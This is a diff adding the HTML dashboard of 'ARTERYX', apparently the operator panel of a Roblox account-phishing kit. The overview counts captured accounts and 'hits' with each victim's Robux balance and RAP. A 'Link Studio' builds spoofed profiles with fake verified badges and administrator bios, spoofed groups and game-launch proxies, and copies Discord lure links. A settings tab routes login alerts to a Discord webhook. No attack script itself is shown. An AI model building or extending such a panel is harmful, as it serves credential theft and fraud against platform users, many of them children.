@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ARTERYX — Dashboard</title>
+    <meta name="theme-color" content="#07070b">
+    <meta name="description" content="ARTERYX unified dashboard.">
+    <link rel="icon" href="arcteryx-logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Inter:wght@400;500;600;700&family=Outfit:wght@400;500;600;700&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css?v=23">
+</head>
+<body class="dashboard-body">
+    <!-- ═══ AMBIENT CANVAS STARFIELD ═══ -->
+    <canvas id="bgCanvas" aria-hidden="true"></canvas>
+
+    <!-- ═══ FIXED TOP HEADER ═══ -->
+    <header class="arteryx-header" id="triplehookHeader">
+        <div class="header-brand-wrap">
+            <a href="/dashboard" class="header-brand-link">
+                <img src="arcteryx-logo.png" alt="ARTERYX" class="header-brand-logo">
+                <span class="header-brand-name">ARTERYX</span>
+            </a>
+        </div>
+        <div class="header-center-actions">
+            <button class="header-pill-btn" onclick="openGamesModal()">
+                <i class="fas fa-gamepad"></i>
+                <span>Games</span>
+            </button>
+            <button class="header-pill-btn" onclick="document.querySelector('.bottom-section-grid')?.scrollIntoView({behavior:'smooth',block:'nearest'})">
+                <i class="fas fa-chart-line"></i>
+                <span>Insights</span>
+            </button>
+        </div>
+        <div class="header-user-section">
+            <div class="header-user" id="headerUser" onclick="toggleHeaderDropdown(event)">
+                <div class="header-avatar-wrap">
+                    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="" class="header-avatar" id="headerAvatar">
+                </div>
+                <span class="header-username" id="headerUsername">Guest</span>
+                <svg class="header-user-caret" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="header-dropdown" id="headerDropdown">
+                <div class="header-dropdown-item" onclick="switchMainTab('settings')">
+                    <i class="fas fa-sliders-h"></i>
+                    <span>Settings</span>
+                </div>
+                <div class="header-dropdown-item" onclick="openGamesModal()">
+                    <i class="fas fa-gamepad"></i>
+                    <span>Games Catalog</span>
+                </div>
+                <div class="header-dropdown-divider"></div>
+                <a href="/logout" class="header-dropdown-item" style="color:#ef4444;">
+                    <i class="fas fa-sign-out-alt"></i>
+                    <span>Log Out</span>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- ═══ FLOATING DOCK NAVIGATION ═══ -->
+    <nav class="dock-nav" id="sidebar">
+        <div class="dock-item active" data-tab="main" onclick="switchMainTab('main', this)">
+            <i class="fas fa-home"></i>
+            <span class="dock-tooltip">Overview</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" data-tab="domains" onclick="switchMainTab('domains', this)">
+            <i class="fas fa-globe"></i>
+            <span class="dock-tooltip">Domains</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+            <span class="dock-badge" id="sidebarBadge">0</span>
+        </div>
+        <div class="dock-item" data-tab="settings" onclick="switchMainTab('settings', this)">
+            <i class="fas fa-sliders-h"></i>
+            <span class="dock-tooltip">Settings</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" onclick="openGamesModal()">
+            <i class="fas fa-gamepad"></i>
+            <span class="dock-tooltip">Games</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <a href="/logout" class="dock-item" style="text-decoration:none;">
+            <i class="fas fa-sign-out-alt"></i>
+            <span class="dock-tooltip">Log Out</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </a>
+    </nav>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <main class="main-content">
+
+        <!-- ── TAB: OVERVIEW ── -->
+        <section class="tab-panel active" id="main-tab" aria-label="Overview">
+            <div class="top-stats-grid">
+                <!-- Card 1: Total Accounts -->
+                <div class="modern-stat-card neon-hover-card" id="accounts-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 32 32" fill="currentColor">
+                            <path d="M 16 4 C 9.37 4 4 9.37 4 16 C 4 22.63 9.37 28 16 28 C 22.63 28 28 22.63 28 16 C 28 15.52 27.96 15.04 27.91 14.57 C 27.51 14.84 27.02 15 26.5 15 C 25.42 15 24.51 14.31 24.16 13.36 C 23.54 13.76 22.8 14 22 14 C 19.79 14 18 12.21 18 10 C 18 9.27 18.21 8.59 18.56 7.99 C 18.54 8 18.52 8 18.5 8 C 17.12 8 16 6.88 16 5.5 C 16 4.94 16.19 4.43 16.5 4.02 C 16.33 4.01 16.17 4 16 4 Z M 16 15 C 15.45 15 15 15.45 15 16 C 15 16.55 15.45 17 16 17 C 16.55 17 17 16.55 17 16 C 17 15.45 16.55 15 16 15 Z"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Total Accounts</div>
+                        <div class="stat-value" id="statsAccounts">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="accUserAvatar" alt="">
+                                <span class="card-user-name" id="accUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsAccountsDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="accMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="accMiniLabels"></div>
+                            <div class="stat-mini-pct" id="accMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 2: Total Visits -->
+                <div class="modern-stat-card neon-hover-card" id="visits-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="7" r="3"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Total Visits</div>
+                        <div class="stat-value" id="statsVisits">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="visitsUserAvatar" alt="">
+                                <span class="card-user-name" id="visitsUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsVisitsDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="visitsMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="visitsMiniLabels"></div>
+                            <div class="stat-mini-pct" id="visitsMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 3: Active Links -->
+                <div class="modern-stat-card neon-hover-card" id="clicks-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Active Links</div>
+                        <div class="stat-value" id="statsClicks">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="clicksUserAvatar" alt="">
+                                <span class="card-user-name" id="clicksUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsClicksDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="clicksMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="clicksMiniLabels"></div>
+                            <div class="stat-mini-pct" id="clicksMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 4: Summary Card Spanning 2fr -->
+                <div class="modern-stat-card summary-card-container" id="summary-card">
+                    <div class="summary-content">
+                        <div class="summary-grid-horizontal">
+                            <!-- Summary Total -->
+                            <div class="summary-item">
+                                <div class="summary-label">Summary Total</div>
+                                <div class="summary-value" id="weeklySummaryVal">0</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklySummaryDelta">+0 <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniSummary"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniSummaryL"></div>
+                                    <div class="summary-mini-pct" id="sMiniSummaryP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+
+                            <!-- RAP Total -->
+                            <div class="summary-item">
+                                <div class="summary-label">RAP Total</div>
+                                <div class="summary-value" id="weeklyRapVal">0</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklyRapDelta">+0 <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniRap"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniRapL"></div>
+                                    <div class="summary-mini-pct" id="sMiniRapP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+
+                            <!-- Balance Total -->
+                            <div class="summary-item">
+                                <div class="summary-label">Balance Total</div>
+                                <div class="summary-value" id="weeklyBalanceVal">0 R$</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklyBalanceDelta">+0 R$ <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniBalance"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniBalanceL"></div>
+                                    <div class="summary-mini-pct" id="sMiniBalanceP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Divider -->
+            <div class="stat-divider"></div>
+
+            <!-- Activity Chart & Real Leaderboard -->
+            <div class="bottom-section-grid">
+                <!-- Activity Card -->
+                <div class="overview-card">
+                    <div class="chart-header">
+                        <div>
+                            <h2>Activity</h2>
+                            <div class="overview-card-sub">Past 7 days telemetry</div>
+                        </div>
+                        <div class="chart-filter-pills">
+                            <button class="chart-pill active">Summary</button>
+                            <button class="chart-pill">RAP</button>
+                            <button class="chart-pill">Balance</button>
+                        </div>
+                    </div>
+                    <canvas id="overviewChart" height="260" aria-label="Activity per day" role="img"></canvas>
+                    <div class="chart-axis-x" id="chartAxis" aria-hidden="true"></div>
+                </div>
+
+                <!-- Leaderboards Card -->
+                <div class="overview-card leaderboards-card">
+                    <div class="leaderboards-header">
+                        <div>
+                            <h2>Leaderboard</h2>
+                            <div class="overview-card-sub">Top operators this week</div>
+                        </div>
+                    </div>
+                    <div class="leaderboards-list" id="activityFeed"></div>
+                </div>
+            </div>
+
+            <!-- Divider -->
+            <div class="stat-divider"></div>
+
+            <!-- Live Captures & Operator Stats -->
+            <div class="live-section-grid">
+                <!-- Live Hits/Visits Card -->
+                <div class="overview-card live-hits-card">
+                    <div class="live-hits-header" onclick="toggleHitsMode()" title="Toggle Hits / Visits">
+                        <div>
+                            <h2 id="hitsCardTitle">Hits</h2>
+                            <div class="overview-card-sub" id="hitsCardSub">Showing hits · click for visits</div>
+                        </div>
+                        <span class="lower-card-meta" id="hitsCardModeBadge">Hits</span>
+                    </div>
+                    <div class="live-hits-thead">
+                        <span>User</span>
+                        <span>Time</span>
+                        <span>Balance</span>
+                        <span>Summary</span>
+                        <span>RAP</span>
+                        <span>Operator</span>
+                    </div>
+                    <div class="hits-table-body-wrap" id="hitsTableBody"></div>
+                    <div class="hits-empty" id="hitsEmptyMsg" style="padding: 24px; text-align: center; color: rgba(255,255,255,0.3); font-family: 'Rajdhani', sans-serif;">No recent captures recorded.</div>
+                </div>
+
+                <!-- Operator Profile Card -->
+                <div class="overview-card user-stats-card">
+                    <div class="user-stats-avatar-orbit">
+                        <div id="operatorCardAvatar" style="width:100%;height:100%;border-radius:50%;overflow:hidden;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center;">
+                            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        </div>
+                    </div>
+                    <div class="user-stats-name" id="operatorCardName">Guest</div>
+                    <div class="user-stats-role" id="operatorCardRole">Operator</div>
+                    <div class="user-stats-grid">
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Today</div>
+                            <div class="user-stat-val" id="opTodayHits">0</div>
+                        </div>
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Total</div>
+                            <div class="user-stat-val" id="opTotalHits">0</div>
+                        </div>
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Rate</div>
+                            <div class="user-stat-val" id="opConvRate">100%</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── TAB: LINK STUDIO (DOMAINS) ── -->
+        <section class="tab-panel" id="domains-tab" aria-label="Link Studio">
+            <div class="domain-head" style="margin-bottom: 24px; text-align: center;">
+                <h2 class="domain-section-title" style="font-family:'Rajdhani',sans-serif;font-size:1.6rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#fff;margin-bottom:6px;">Link Studio</h2>
+                <p class="domain-section-desc" style="font-family:'Rajdhani',sans-serif;font-size:0.88rem;color:rgba(255,255,255,0.45);letter-spacing:0.5px;">Create and customize spoofed user profiles, community groups, and game launch proxies.</p>
+            </div>
+
+            <!-- ── SUB-TAB NAVIGATION ── -->
+            <div class="tab-navigation" style="margin-bottom:24px;">
+                <button class="tab-btn active" data-tab="profile" onclick="showControllerTab('profile')">
+                    <i class="fas fa-user"></i> Profile
+                </button>
+                <button class="tab-btn" data-tab="community" onclick="showControllerTab('community')">
+                    <i class="fas fa-users"></i> Communities
+                </button>
+                <button class="tab-btn" data-tab="games" onclick="openGamesModal()">
+                    <i class="fas fa-gamepad"></i> Games
+                </button>
+            </div>
+
+            <!-- ── CONTROLLER STAGE CARD CONTAINER ── -->
+            <div class="domains-stage-card card" id="controllerStageCard" style="position:relative;">
+                <div class="tab-loading-overlay" id="controllerLoadingOverlay">
+                    <div class="loading-dots"><span></span><span></span><span></span></div>
+                </div>
+
+                <!-- ── 1. PROFILE CONTROLLER TAB ── -->
+                <div id="profileForm" class="tab-content">
+                    <div class="profile-preview">
+                        <div class="profile-left">
+                            <div class="avatar-wrapper">
+                                <img id="stageProfileAvatar" class="profile-avatar avatar-in" 
+                                     src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/420/420/AvatarHeadshot/Png/noFilter" 
+                                     alt="Roblox" 
+                                     onerror="this.onerror=null;this.src='/proxy/image?url=https%3A%2F%2Ftr.rbxcdn.com%2F30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png%2F420%2F420%2FAvatarHeadshot%2FPng%2FnoFilter'">
+                                <div id="stageAvatarStatusIcon" class="avatar-status-icon" style="background-image: url('https://images.rbxcdn.com/34d457aefdc88489b8d2b2c4f30ae450-friendsstatus_dark.svg'); background-position: 0px 0px; display:block;"></div>
+                            </div>
+                            <div class="profile-info">
+                                <h2>
+                                    <span id="stagePreviewDisplayName">Roblox</span>
+                                    <img id="stagePremiumIcon" class="premium-icon" src="https://images.rbxcdn.com/e25c04467c6999a093edec3b55bc5963-premium_dark.svg" style="display:none;" alt="Premium">
+                                    <img id="stageVerifiedIcon" class="verified-icon" src="https://images.rbxcdn.com/b52994086ea761c78479e0004ff9cc75-verified_badge_dark.svg" style="display:inline;" alt="Verified">
+                                </h2>
+                                <p class="username" id="stagePreviewUsername">Roblox</p>
+                                <div class="profile-stats">
+                                    <span><strong id="stagePreviewFriends">200</strong> Friends</span>
+                                    <span><strong id="stagePreviewFollowers">10,842,000</strong> Followers</span>
+                                    <span><strong id="stagePreviewFollowing">68</strong> Following</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="profile-right">
+                            <button type="button" class="profile-btn copy-url" id="stageCopyProfileBtn" onclick="copyStageProfileLink()">
+                                <i class="fas fa-link"></i> Copy Link
+                            </button>
+                            <button type="button" class="profile-btn copy-discord" id="stageCopyDiscordBtn" onclick="copyStageProfileDiscordLink()">
+                                <div class="btn-main"><i class="fab fa-discord"></i> Copy Discord Link</div>
+                                <div class="btn-sub">Formatted embed link</div>
+                            </button>
+                            <button type="button" class="profile-btn goto" id="stageGotoProfileBtn" onclick="openStageProfileLink()">
+                                <i class="fas fa-external-link-alt"></i> Test Profile
+                            </button>
+                        </div>
+                    </div>
+
+                    <form id="stageProfileFormElement" onsubmit="event.preventDefault(); saveStageProfile();">
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageRealUsername">Real Roblox Username</label>
+                                <div style="display:flex;gap:8px;">
+                                    <input type="text" id="stageRealUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                                    <button type="button" class="load-avatar-addon-btn" onclick="fetchStageRobloxUser()"><i class="fas fa-sync-alt"></i> Load</button>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFakeUsername">Vanity Username</label>
+                                <input type="text" id="stageFakeUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageDisplayUsername">Display Name</label>
+                                <input type="text" id="stageDisplayUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="input-group">
+                                <label for="stagePremiumSelect">Premium Membership</label>
+                                <select id="stagePremiumSelect" onchange="updateStageProfilePreview()">
+                                    <option value="No" selected>No</option>
+                                    <option value="Yes">Yes</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-row four-col">
+                            <div class="input-group">
+                                <label for="stageVerifiedSelect">Verified Badge</label>
+                                <select id="stageVerifiedSelect" onchange="updateStageProfilePreview()">
+                                    <option value="No">No</option>
+                                    <option value="Yes" selected>Yes</option>
+                                </select>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFriendsInput">Friends</label>
+                                <input type="number" id="stageFriendsInput" min="0" placeholder="200" value="200" oninput="updateStageProfilePreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFollowersInput">Followers</label>
+                                <input type="number" id="stageFollowersInput" min="0" placeholder="10842000" value="10842000" oninput="updateStageProfilePreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFollowingsInput">Following</label>
+                                <input type="number" id="stageFollowingsInput" min="0" placeholder="68" value="68" oninput="updateStageProfilePreview()">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageActivitySelect">Activity Status</label>
+                                <select id="stageActivitySelect" onchange="updateStageProfilePreview()">
+                                    <option value="Online" selected>Online</option>
+                                    <option value="Offline">Offline</option>
+                                    <option value="In Game">In Game</option>
+                                    <option value="In Studio">In Studio</option>
+                                </select>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageCreatedDate">Join Date</label>
+                                <div class="date-input-wrapper">
+                                    <input type="date" id="stageCreatedDate" value="2006-02-27">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-row full-width">
+                            <div class="input-group">
+                                <label for="stageAboutInput">About / Bio</label>
+                                <textarea id="stageAboutInput" rows="3" placeholder="Custom Roblox profile description or bio...">Welcome to the Roblox profile! Official platform administrator account.</textarea>
+                            </div>
+                        </div>
+
+                        <button type="button" class="save-btn" id="stageSaveProfileBtn" onclick="saveStageProfile()">
+                            <i class="fas fa-save"></i> SAVE PROFILE
+                        </button>
+                    </form>
+                </div>
+
+                <!-- ── 2. COMMUNITY CONTROLLER TAB ── -->
+                <div id="communityForm" class="tab-content hidden">
+                    <div class="profile-preview">
+                        <div class="profile-left">
+                            <div class="avatar-wrapper">
+                                <img id="stageCommunityAvatar" class="profile-avatar" src="https://freepngimg.com/thumb/vector/1-2-vector-png-image.png" alt="Group logo">
+                            </div>
+                            <div class="profile-info">
+                                <h2>
+                                    <span id="stagePreviewGroupName">One Time YT</span>
+                                    <img id="stageGroupVerifiedIcon" class="verified-icon" src="https://images.rbxcdn.com/b52994086ea761c78479e0004ff9cc75-verified_badge_dark.svg" style="display:none;" alt="Verified">
+                                </h2>
+                                <p class="username no-at">By <span id="stagePreviewOwnerName">real_pika0394058201840</span></p>
+                                <div class="profile-stats">
+                                    <span><strong id="stagePreviewMembers">4,323</strong> Members</span>
+                                    <span><strong id="stagePreviewFunds">0</strong> Funds</span>
+                                    <span><strong id="stagePreviewRank">Member</strong> Rank</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="profile-right">
+                            <button type="button" class="profile-btn copy-url" id="stageCopyCommunityBtn" onclick="copyStageCommunityLink()">
+                                <i class="fas fa-link"></i> Copy Link
+                            </button>
+                            <button type="button" class="profile-btn copy-discord" id="stageCopyDiscordCommunityBtn" onclick="copyStageCommunityDiscordLink()">
+                                <div class="btn-main"><i class="fab fa-discord"></i> Copy Discord Link</div>
+                                <div class="btn-sub">Formatted embed link</div>
+                            </button>
+                            <button type="button" class="profile-btn goto" id="stageGotoCommunityBtn" onclick="openStageCommunityLink()">
+                                <i class="fas fa-external-link-alt"></i> Test Community
+                            </button>
+                        </div>
+                    </div>
+
+                    <form id="stageCommunityFormElement" onsubmit="event.preventDefault(); saveStageCommunity();">
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageRealGroupId">Real Group ID</label>
+                                <div style="display:flex;gap:8px;">
+                                    <input type="text" id="stageRealGroupId" placeholder="e.g. 32863920" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                                    <button type="button" class="load-avatar-addon-btn" onclick="fetchStageRobloxGroup()"><i class="fas fa-sync-alt"></i> Load</button>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupName">Group Name</label>
+                                <input type="text" id="stageGroupName" placeholder="One Time YT" value="One Time YT" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageGroupOwner">Owner Username</label>
+                                <input type="text" id="stageGroupOwner" placeholder="real_pika0394058201840" value="real_pika0394058201840" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupMembers">Member Count</label>
+                                <input type="number" id="stageGroupMembers" min="0" placeholder="4323" value="4323" oninput="updateStageCommunityPreview()">
+                            </div>
+                        </div>
+
+                        <div class="form-row three-col">
+                            <div class="input-group">
+                                <label for="stageGroupFunds">Group Funds (R$)</label>
+                                <input type="number" id="stageGroupFunds" min="0" placeholder="0" value="0" oninput="updateStageCommunityPreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupRank">Member Rank Title</label>
+                                <input type="text" id="stageGroupRank" placeholder="Member" value="Member" oninput="updateStageCommunityPreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupRankNum">Rank Number</label>
+                                <input type="number" id="stageGroupRankNum" min="1" value="1" oninput="updateStageCommunityPreview()">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group full">
+                                <label for="stageGroupLogo">Group Logo URL</label>
+                                <input type="text" id="stageGroupLogo" placeholder="https://..." value="https://freepngimg.com/thumb/vector/1-2-vector-png-image.png" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row full-width">
+                            <div class="input-group">
+                                <label for="stageGroupDesc">Group Description</label>
+                                <textarea id="stageGroupDesc" rows="3" placeholder="Roblox group announcement or description..."></textarea>
+                            </div>
+                        </div>
+
+                        <button type="button" class="save-btn" id="stageSaveCommunityBtn" onclick="saveStageCommunity()">
+                            <i class="fas fa-save"></i> SAVE COMMUNITY
+                        </button>
+                    </form>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ── TAB: SETTINGS ── -->
+        <section class="tab-panel" id="settings-tab" aria-label="Settings" style="position:relative;overflow:hidden;min-height:540px;">
+            <canvas id="settingsDotsCanvas" class="settings-dots-canvas"></canvas>
+
+            <div class="settings-glass-container">
+                <div class="settings-glass-header">
+                    <h2 class="settings-title">Settings</h2>
+                    <p class="settings-subtitle">Manage your Discord webhook to receive instant login alerts.</p>
+                </div>
+
+                <div class="webhook-glass-card">
+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fab fa-discord"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Discord Webhook</div>
+                            <div class="webhook-card-desc">Real-time alerts whenever a user signs in</div>
+                        </div>
+                        <div class="webhook-status-pill" id="settingsWebhookBadge">
+                            <span class="status-pulse-dot"></span>
+                            <span id="settingsWebhookBadgeText">Checking...</span>
+                        </div>
+                    </div>
+
+                    <div class="webhook-input-group">
+                        <label class="webhook-input-label" for="settingsWebhookUrl">
+                            <span><i class="fas fa-link"></i> Webhook URL</span>
+                            <span class="webhook-label-hint">discord.com/api/webhooks/...</span>
+                        </label>
+                        <div class="webhook-input-wrapper">
+                            <i class="fab fa-discord webhook-input-icon"></i>
+                            <input type="url" id="settingsWebhookUrl" class="webhook-glass-input" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+                            <button type="button" class="webhook-paste-btn" onclick="pasteWebhookUrl()" title="Paste from clipboard">
+                                <i class="fas fa-paste"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="webhook-action-row">
+                        <button type="button" id="saveWebhookBtn" class="webhook-btn-white" onclick="saveSettingsWebhook()">
+                            <i class="fas fa-save"></i> Save Webhook
+                        </button>
+                        <button type="button" id="testWebhookBtn" class="webhook-btn-glass" onclick="testSettingsWebhook()">
+                            <i class="fas fa-paper-plane"></i> Test Webhook
+                        </button>
+                    </div>
+
+                    <div id="settingsWebhookMsg" class="webhook-glass-alert" style="display:none;"></div>
+
+                    <div class="webhook-guide-card">
+                        <i class="fas fa-info-circle webhook-guide-icon"></i>
+                        <div class="webhook-guide-text">
+                            In your Discord channel: go to <strong>Channel Settings &rarr; Integrations &rarr; Webhooks</strong>, create a new webhook, copy its URL, and paste it above.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══ GAMES MODAL ═══ -->
+    <div class="modal-overlay" id="gamesModal" onclick="closeGamesModal(event)" role="dialog" aria-modal="true" aria-label="Games">
+        <div class="games-modal-panel" onclick="event.stopPropagation()">
+            <div class="games-top-nav-bar">
+                <nav class="games-nav-tabs" aria-label="Navigation">
+                    <button class="g-tab" onclick="navigateFromGames('profile')">Profile</button>
+                    <button class="g-tab" onclick="navigateFromGames('group')">Group</button>
+                    <button class="g-tab active" aria-current="page">Games</button>
+                    <button class="g-tab" onclick="navigateFromGames('webhook')">Webhook</button>
+                    <button class="g-tab" onclick="navigateFromGames('insights')">Insights</button>
+                </nav>
+                <div class="games-top-nav-actions">
+                    <button class="games-action-btn modal-close-btn" title="Close" onclick="closeGamesModal()" aria-label="Close games">
+                        <svg class="ic" width="16" height="16" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    </button>
+                </div>
+            </div>
+
+            <div class="games-search-section">
+                <div class="games-pill-search-wrap">
+                    <svg class="games-search-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+                    </svg>
+                    <input class="games-pill-search-input" id="gamesSearchInput" type="text" placeholder="Search Roblox games..." oninput="handleGamesSearchInput(this.value)" autocomplete="off" spellcheck="false" aria-label="Search Roblox games">
+                    <button class="games-search-clear-btn" id="gamesSearchClearBtn" onclick="clearGamesSearch()" style="display:none;" title="Clear search" aria-label="Clear search">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                    </button>
+                    <div class="games-search-spinner" id="gamesSearchSpinner" style="display:none;"></div>
+                </div>
+            </div>
+
+            <div class="games-modal-body">
+                <div class="games-status-banner" id="gamesStatusBanner" style="display:none;"></div>
+                <div class="games-grid" id="gamesGrid"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══ PROFILE CREATOR MODAL ═══ -->
